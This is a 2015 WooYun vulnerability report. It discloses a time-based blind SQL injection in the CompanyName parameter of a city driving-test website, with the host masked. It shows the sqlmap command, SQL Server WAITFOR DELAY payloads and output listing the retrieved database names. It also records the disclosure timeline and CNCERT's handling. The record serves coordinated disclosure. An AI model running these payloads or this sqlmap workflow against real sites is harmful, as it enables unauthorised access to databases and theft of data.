wybug_title: 某市驾考网站存在sql盲注
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-08-21：	细节已通知厂商并且等待厂商处理中									2015-08-24：	cncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开									2015-09-03：	细节向核心白帽子及相关领域专家公开									2015-09-13：	细节向普通白帽子公开									2015-09-23：	细节向实习白帽子公开									2015-10-08：	细节向公众公开  简要描述： sql盲注 sqlmap可直接跑表、用户名等信息扫目录可发现直接下载疑似内部表格 详细说明：  



注入：**.**.**.**/OAData/CarListData 参数 CompanyName Cph   漏洞证明：  栗子：
PS F:\sqlmap> python sqlmap.py -u 'http://**.**.**.**/OAData/CarListData?CompanyName=1' --tables         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20140923}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://**.**.**.**[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 21:54:33[21:54:34] [INFO] resuming back-end DBMS 'microsoft sql server'[21:54:34] [INFO] testing connection to the target URLsqlmap got a 302 redirect to 'http://**.**.**.**:80/'. Do you want to follow? [Y/n] nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: CompanyName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: CompanyName=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: CompanyName=1' WAITFOR DELAY '0:0:5'-----[21:54:36] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[21:54:36] [INFO] fetching database names[21:54:36] [INFO] fetching number of databases[21:54:36] [WARNING] time-based comparison requires larger statistical model, please wait..............................[21:54:43] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)[21:54:44] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors35[21:55:12] [INFO] retrieved: _JZ_JX_HUANQIU[21:59:50] [INFO] retrieved: _ShenZhenJiaoWei[22:05:16] [INFO] retrieved: _XCSJ[22:06:53] [INFO] retrieved: AnShunKang[22:10:48] [INFO] retrieved: AnShunKangNewLiLun[22:17:41] [INFO] retrieved: ChangCheng[22:21:13] [INFO] retrieved: ChangShaJiaPeiOA[22:26:17] [INFO] retrieved: ChongQingOA
   修复方案：  安全狗   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-24 10:25 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给湖南分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
